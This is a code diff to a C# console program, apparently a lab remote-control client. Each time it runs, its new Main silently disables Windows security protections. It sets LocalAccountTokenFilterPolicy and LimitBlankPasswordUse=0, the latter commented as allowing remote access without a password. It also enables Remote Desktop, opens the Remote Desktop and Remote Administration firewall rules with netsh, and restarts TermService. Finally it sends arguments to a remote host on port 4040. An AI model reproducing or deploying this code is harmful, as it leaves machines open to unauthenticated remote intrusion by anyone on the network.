@@ -1,19 +1,25 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Dynamic;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
+using System.ServiceProcess;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using Microsoft.Win32;
 using Newtonsoft.Json;
 
-namespace LaborClient
+namespace Client
 {
     class Program
     {
+
+        static string ROOT = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Labor.Client");
+
 
         static void StartProxy()
         {
@@ -90,117 +96,162 @@ namespace LaborClient
 
         public static void Main(string[] args)
         {
-            var dict = new Dictionary<string, string>();
 
-            for (int i = 0; i < args.Length; i++)
-            {   
-                string arg = args[i];
-                if(arg.StartsWith("-") && args.Length > i+1)
+
+            try
+            {
+                // Define the registry key path
+                string registryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
+
+                // Open the registry key with write access
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
                 {
-                    dict.Add(arg.Substring(1), args[i+1]);
-                    i++;
+                    if (key != null)
+                    {
+                        // Set the value for LocalAccountTokenFilterPolicy to 1
+                        key.SetValue("LocalAccountTokenFilterPolicy", 1, RegistryValueKind.DWord);
+                        Console.WriteLine("Registry key set successfully.");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Registry path not found.");
+                    }
                 }
             }
-
-            if (dict.Count <= 0)
+            catch (UnauthorizedAccessException)
             {
-                Console.WriteLine("Tidak ada perintah di berikan!.");
-            } else
+                Console.WriteLine("Access denied. Please run the program as an administrator.");
+            }
+            catch (Exception ex)
             {
-                for(int i = 0; i < dict.Count; i++)
-                {
-                    string key = dict.Keys.ElementAt(i);
-
-                    Console.WriteLine(Handle(key, dict.GetValueOrDefault(key)));
-                }
+                Console.WriteLine($"Error setting registry key: {ex.Message}");
             }
 
 
+
+            try
+            {
+                // Enable Remote Desktop
+                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server", true);
+                if (key != null)
+                {
+                    key.SetValue("fDenyTSConnections", 0); // 0 enables Remote Desktop, 1 disables it
+                    key.Close();
+                }
+
+                // Enable Network Level Authentication (NLA) for Remote Desktop (optional)
+                key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", true);
+                if (key != null)
+                {
+                    key.SetValue("UserAuthentication", 1); // 1 enables NLA, 0 disables it
+                    key.Close();
+                }
+
+                Console.WriteLine("Remote Desktop has been enabled.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error setting registry key: {ex.Message}");
+            }
+
+
+
+            try
+            {
+                // Command to enable Remote Desktop firewall rule
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "netsh",
+                    Arguments = "advfirewall firewall set rule group=\"remote desktop\" new enable=yes",
+                    Verb = "runas", // Run as administrator
+                    UseShellExecute = true,
+                    CreateNoWindow = true
+                });
+
+                Console.WriteLine("Firewall rule for Remote Desktop has been enabled.");
+
+                // Enable Remote Administration firewall rule
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "netsh",
+                    Arguments = "advfirewall firewall set rule group=\"Remote Administration\" new enable=yes",
+                    Verb = "runas", // Run as administrator
+                    UseShellExecute = true,
+                    CreateNoWindow = true
+                });
+
+
+                Console.WriteLine("Firewall rule for Remote Administration has been enabled.");
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error setting firewall key: {ex.Message}");
+            }
+
+
+
+            try
+            {
+                // Path to the policy in the registry
+                string registryPath = @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa";
+                string valueName = "LimitBlankPasswordUse";
+
+                // Set the value to 0 to allow remote access without a password
+                Registry.SetValue(registryPath, valueName, 0, RegistryValueKind.DWord);
+
+                Console.WriteLine("Remote access without password enabled successfully.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+
+            }
+
+
+
+            // Restart the Remote Desktop service
+            ServiceController sc = new ServiceController("TermService");
+            sc.Stop();
+            sc.WaitForStatus(ServiceControllerStatus.Stopped);
+            sc.Start();
+            sc.WaitForStatus(ServiceControllerStatus.Running);
+
+            Console.WriteLine("Remote Desktop service restarted.");
+
+
+
+            if (args.Length == 0)
+            {
+                Console.WriteLine("Remote Desktop Labor\r\nUsage:\r\nremote.exe [\\\\hostname] command");
+                return;
+            }
+
+            try
+            {
+                // Create a TcpClient instance and connect to the server
+                TcpClient client = new TcpClient(args[0], 4040);
+
+                // Get a stream object for reading and writing
+                NetworkStream stream = client.GetStream();
+
+                // Send a message to the server (this could be any argument or data)
+                string message = String.Join(" ", args.Where(e => e != args[0]).ToArray());
+                byte[] data = Encoding.UTF8.GetBytes(message);
+                stream.Write(data, 0, data.Length);
+                Console.WriteLine("Sent: " + message);
+
+                // Optionally, read a response from the server
+                byte[] buffer = new byte[1024];
+                int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
 
         }
     }
 }
-
-//internal class Program
-//{
-//    [DllImport("user32.dll")]
-//    private static extern IntPtr GetDesktopWindow();
-
-//    [DllImport("user32.dll")]
-//    private static extern IntPtr GetWindowDC(IntPtr hWnd);
-
-//    [DllImport("gdi32.dll")]
-//    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, CopyPixelOperation rop);
-
-//    [DllImport("gdi32.dll")]
-//    private static extern IntPtr CreateCompatibleDC(IntPtr hdc);
-
-//    [DllImport("gdi32.dll")]
-//    private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
-
-//    [DllImport("gdi32.dll")]
-//    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);
-
-//    [DllImport("gdi32.dll")]
-//    private static extern bool DeleteObject(IntPtr hObject);
-
-//    [DllImport("gdi32.dll")]
-//    private static extern bool DeleteDC(IntPtr hdc);
-
-//    public static Bitmap CaptureFullScreen()
-//    {
-//        // Get the desktop window handle
-//        IntPtr desktopWnd = GetDesktopWindow();
-//        IntPtr desktopDC = GetWindowDC(desktopWnd);
-//        IntPtr memDC = CreateCompatibleDC(desktopDC);
-
-
-//        // Get the screen dimensions
-//        int screenWidth = (int)(Screen.PrimaryScreen.Bounds.Width * 1.25);
-//        int screenHeight = (int)(Screen.PrimaryScreen.Bounds.Height * 1.25);
-
-//        // Create a compatible bitmap for the screen dimensions
-//        IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, screenWidth, screenHeight);
-//        IntPtr oldBitmap = SelectObject(memDC, hBitmap);
-
-//        // Perform bit-block transfer (copy screen to bitmap)
-//        BitBlt(memDC, 0, 0, screenWidth, screenHeight, desktopDC, 0, 0, CopyPixelOperation.SourceCopy);
-
-//        // Create a .NET Bitmap from the HBITMAP
-//        Bitmap bitmap = Image.FromHbitmap(hBitmap);
-
-//        // Clean up GDI objects
-//        SelectObject(memDC, oldBitmap);
-//        DeleteObject(hBitmap);
-//        DeleteDC(memDC);
-//        DeleteDC(desktopDC);
-
-//        return bitmap;
-//    }
-
-//    public static Bitmap ResizeImage(Bitmap originalImage, int targetHeight)
-//    {
-//        int targetWidth = (int)((float)originalImage.Width / originalImage.Height * targetHeight);
-//        Bitmap resizedImage = new Bitmap(targetWidth, targetHeight);
-
-//        using (Graphics g = Graphics.FromImage(resizedImage))
-//        {
-//            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
-//            g.DrawImage(originalImage, 0, 0, targetWidth, targetHeight);
-//        }
-
-//        return resizedImage;
-
-//    }
-
-//    public static void Main(string[] args)
-//    {
-
-//        // Capture the entire screen
-//        //Bitmap screenshot = CaptureFullScreen();
-//        //Bitmap resize = ResizeImage(screenshot, 240);
-//        //resize.Save(@"C:\temp\bitblt_screenshot.jpg", ImageFormat.Jpeg);
-
-//        //Console.WriteLine("Full screen captured with BitBlt, including taskbar!");
-//    }
-//}
